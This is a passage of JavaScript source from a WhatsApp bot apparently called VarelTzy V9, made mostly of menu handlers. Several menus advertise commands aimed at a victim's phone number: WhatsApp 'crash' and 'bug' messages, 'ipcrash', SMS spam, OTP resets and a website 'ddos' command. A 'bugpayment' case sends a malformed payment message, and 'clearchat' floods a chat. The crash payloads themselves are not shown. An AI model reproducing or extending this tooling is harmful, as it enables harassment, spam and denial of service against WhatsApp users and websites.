𖤍 ${prefix}𝐝𝐝𝐨𝐬  *<𝐰𝐞𝐛𝐬𝐢𝐭𝐞> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>*

 ༼𝐓𝐐𝐓𝐎༽
➥ 𝐕𝐚𝐫𝐓𝐱𝐒 ( 𝐃𝐄𝐕 )
➥ 𝐎𝐫𝐚𝐧𝐠 𝐓𝐮𝐚 ( 𝐓𝐇𝐄 𝐁𝐄𝐒𝐓 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 )
➥ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 𝐁𝐨𝐭
➥ 𝐑𝐗𝐇𝐋
➥ 𝐗𝐄𝐎𝐍
➥ 𝐏𝐚𝐤𝐓𝐳𝐲`
VxoZap.sendMessage(m.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: xfoto },
    fileName: ucapanWaktu,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: bugmenu,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.linkgc,
            thumbnailUrl: global.imageurl,
            title: global.foter1,
            body: global.foter2,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.idcennel,
            serverMessageId: null,
            newsletterName: global.namacennel
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: global.foter3}}});
}
break
            
             case 'bugmenuv2': {
ewe = `
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot

*\`乂 𝐁𝐔𝐆 𝐄𝐌𝐎𝐉𝐈 𝐕𝟐 乂\`*
> ${prefix}🍁 62xxxx
> ${prefix}✨ 62xxxx
> ${prefix}💯 62xxxx
> ${prefix}💋 62xxxx
> ${prefix}👅 62xxxx
> ${prefix}🌀 62xxxx
> ${prefix}⚡ 62xxxx

*\`乂 𝐔𝐈 𝐂𝐑𝐀𝐒𝐇 乂\`*
> ${prefix}slayer07 *628xxx*
> ${prefix}bugcek *628xxx*
> ${prefix}bug-bunga *628xxx*
> ${prefix}crash-all-wa *628xxx*

*\`乂 𝐖𝐀 𝐂𝐑𝐀𝐒𝐇 乂\`*
> ${prefix}bugori *628xxx*
> ${prefix}bugmods *628xxx*
> ${prefix}bugbisnis *628xxx
> ${prefix}wa-meta *628xxx*
> ${prefix}wa-web *628xxx*

*\`乂 𝐁𝐄𝐓𝐀 𝐂𝐑𝐀𝐒𝐇 乂\`*
> ${prefix}betaonly *628xxx|amount*
> ${prefix}lokasnew *628xxx|amount*
> ${prefix}bug-vrl *628xxx*
> ${prefix}betacrash *628xxx*

*\`乂 𝐈𝐏 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 乂\`*
> ${prefix}ipcrash *628xxx*
> ${prefix}ipturuv2 *628xxx*`
VxoZap.sendMessage(m.chat, { 
	           text: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: Zets
                    })
     await VxoZap.sendMessage(m.chat, {
                        audio: fs.readFileSync('./lib/menu.mp3'),
                        mimetype: './lib/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

// TXT MENU
case 'txtmenu':
hohe = [
  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JOIN SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vahy9422ER6b9rNI5Q3v\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vahy9422ER6b9rNI5Q3v\"}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot

*\`乂 𝐓𝐄𝐊𝐒 𝐁𝐀𝐍𝐍𝐄𝐃 乂\`*
> ${prefix}txtban1
> ${prefix}txtban2
> ${prefix}txtban3`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `ׁׁׅ᥎ׁׅɑׁׅꭈׁׅꫀׁׅܻ݊ᥣׁׅ֪tׁׅzׁׅ֬ᨮׁׅ֮`
})
break
case 'domainmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
anji = `Hallo ${pushname}

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot

*\`乂 𝐃𝐎𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔 乂\`*
> ${prefix}listdomain
> ${prefix}delsubdo
> ${prefix}listsubdo`
VxoZap.sendButton(from,  hohe, m, {
body: anji,
footer: `ׁׁׅ᥎ׁׅɑׁׅꭈׁׅꫀׁׅܻ݊ᥣׁׅ֪tׁׅzׁׅ֬ᨮׁׅ֮`
})
break
case 'installmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot

*\`乂 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 - 𝐌𝐄𝐍𝐔 乂\`*
> ${prefix}installthema 
> ${prefix}installpanel
> ${prefix}uninstallpanel
> ${prefix}hbpanel
> ${prefix}startwings
> ${prefix}installwing`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `ׁׁׅ᥎ׁׅɑׁׅꭈׁׅꫀׁׅܻ݊ᥣׁׅ֪tׁׅzׁׅ֬ᨮׁׅ֮`
})
break
case 'cpmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot

*\`乂 𝐂𝐑𝐄𝐀𝐓𝐄 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 乂\`*
> ${prefix}addusr
> ${prefix}addsrv
> ${prefix}ramlist
> ${prefix}delsrv
> ${prefix}delusr
> ${prefix}listpanel
> ${prefix}addpanel
> ${prefix}listadmin
> ${prefix}addadmin
> ${prefix}listsrv
> ${prefix}listusr
> ${prefix}delpanel`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `᥎ׁׅɑׁׅꭈׁׅꫀׁׅܻ݊ᥣׁׅ֪tׁׅzׁׅ֬ᨮׁׅ֮`
})
break
// AKSES MENU
case 'aksesmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot

*\`乂 𝐀𝐊𝐒𝐄𝐒 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}adduser 62xxx
> ${prefix}delluser 62xxx
> ${prefix}listuser
> ${prefix}addseller 62xxx
> ${prefix}delseller 62xxx`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// SOUND MENU
case 'soundmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}

*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐒𝐎𝐔𝐍𝐃 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}sound1 - .sound161`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// GROUP MENU
case 'groupmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐆𝐑𝐎𝐔𝐏 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}pushkontak *text*
> ${prefix}bcgroup *text*
> ${prefix}hidetag *text*
> ${prefix}editsubjek *text*
> ${prefix}editdesk *text*
> ${prefix}inspect *link gc*
> ${prefix}add *62xxx*
> ${prefix}kick *62xxx*
> ${prefix}promote *62xxx*
> ${prefix}demote *62xxx*
> ${prefix}linkgroup
> ${prefix}resetlinkgc`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
case "vpsmenu": {
let teksmenu = `
Silahkan Pilih Fitur Cvps Ubuntu`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ' ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗'
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Fitur Cvps Digital Ocean", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${global.namaowner}\", "rows": [{ "header": "Fitur Changeapido", "title": "Changeapido Simpel", "id": ".changeapido" }, 
{ "header": "Fitur Cekakunv1", "title": "Cekakunv1 Simpel", "id": ".cekakunv1" }, 
{ "header": "Fitur Cekakunv2", "title": "Cekakunv2 Simpel", "id": ".cekakunv2" },
{ "header": "Fitur Cvpsubuntu", "title": "Cvpsubuntu Simpel", "id": ".cvpsubuntu" }, 
{ "header": "Fitur Cvps", "title": "Cvps Simpel", "id": ".cvps" }, 
{ "header": "Fitur Listdroplet", "title": "Listdroplet Simpel", "id": ".listdroplet" }, 
{ "header": "Fitur Deldroplet", "title": "Deldroplet Simpel", "id": ".deldroplet" }, 
{ "header": "Fitur Rebuildvps", "title": "Rebuildvps Simpel", "id": ".rebuildvps" }, 
{ "header": "Fitur Resetpassword", "title": "Resetpassword Simpel", "id": ".resetpassword" }]}]}`
}, {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 OWNER\",\"url\":\"https://wa.me/6285655649546\",\"merchant_url\":\"https://wa.me/6285655649546\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: Zets}) 
await VxoZap.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'vareltzymenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}resetotp *62xx*
> ${prefix}unbanned *62xx*
> ${prefix}unbannedv2 *62xx*
> ${prefix}unbannedv3 *62xx*
> ${prefix}spamsms *62xx*
> ${prefix}nowa *62xx*`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// STICKER MENU
case 'stickermenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}attp *text*
> ${prefix}sticker
> ${prefix}smeme`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// DOWNLOAD MENU
case 'downloadmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}tiktokmp4 *link*
> ${prefix}tiktokmp3 *link*
> ${prefix}play *judul*`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// TOOLS MENU
case 'toolsmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐓𝐄𝐗𝐓 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}style *teks*
> ${prefix}fliptext *teks*
> ${prefix}tourl *reply media*`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// ASUPAN MENU
case 'asupanmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VarelTzy','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VarelTzy','description':'Telegram: @varelmek','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `Hallo ${pushname}
*\`乂 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 乂\`*
> 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : ${global.namabot}
> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : ${global.namaowner}
> 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @varelmek
> 𝐕𝐞𝐫𝐬𝐢 𝐁𝐨𝐭 : 𝐕𝟗

*\`乂 𝐅𝐈𝐓𝐔𝐑 𝐁𝐎𝐓 乂\`*
> ${prefix}self
> ${prefix}public
> ${prefix}setppbot
.
*\`乂 𝐓𝐎𝐁𝐀𝐓 - 𝐅𝐈𝐓𝐔𝐑 乂\`*
> ${prefix}tiktokgirl 
> ${prefix}tiktoknukthy 
> ${prefix}tiktokkayes
> ${prefix}tiktokpanrika
> ${prefix}tiktoknotnot
> ${prefix}tiktokghea
> ${prefix}tiktoksantuy
> ${prefix}paptt`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `VarelTzy`
})
break
// CASE LAINNYA
case 'clearchat': {
pee = "\n".repeat(200)
replyy(pee + '😁🖕')
}
break
case 'bugpayment':
if (!isCreator) return replyy(global.nocreator)
var messa = await prepareWAMessageMedia({ image: xfoto }, { upload: VxoZap.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendeqtextMessage": {
"text": `𓁿 𖤍VarelTzy 👊𖤍 𓁿`,
}
}}), { userJid: from, quoted: m})
VxoZap.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
break

case 'addseller':
if (!isDev) return replyy(global.nocreator)
if (!args[0]) return replyy(`Use ${prefix+command} Number\nExample ${prefix+command} 6285655649546`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye2 = await VxoZap.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye2.length == 0) return replyy(`Enter a valid number and register on WhatsApp!!!`)
reseller.push(bnnd)
fs.writeFileSync('./lib/reseller.json', JSON.stringify(reseller))
replyy(`nomer ${bnnd} Sekarang Kamu Bisa Membuat Panel Selamat Menikmati\nJeda 5 menit Setelah Membuat panel`)
break

case 'delseller':
if (!isDev) return replyy(global.nocreator)
if (!args[0]) return replyy(`Use ${prefix+command} Number\nExample ${prefix+command} 6285655649546`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = reseller.indexOf(yaki)
reseller.splice(unp, 1)
fs.writeFileSync('./lib/reseller.json', JSON.stringify(reseller))
replyy(`Yahh nomer ${yaki} telah di hapus di list reseller`)
break

case 'adduser':
if (!isDev) return replyy(global.nocreator)
if (!args[0]) return replyy(`Use ${prefix+command} Number\nExample ${prefix+command} 6285655649546`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await VxoZap.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return replyy(`Enter a valid number and register on WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./lib/user.json', JSON.stringify(owner))
replyy(`Number ${bnnd} Has Been Added to Premium!!!`)
break

case 'delluser':
if (!isDev) return replyy(global.nocreator)
if (!args[0]) return replyy(`Use ${prefix+command} Number\nExample ${prefix+command} 6285655649546`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./lib/user.json', JSON.stringify(owner))
replyy(`Number ${yaki} Has Been Removed From Premium!!!`)
break

case 'listuser':
if (!isDev) return replyy(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
VxoZap.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161':
await loading()
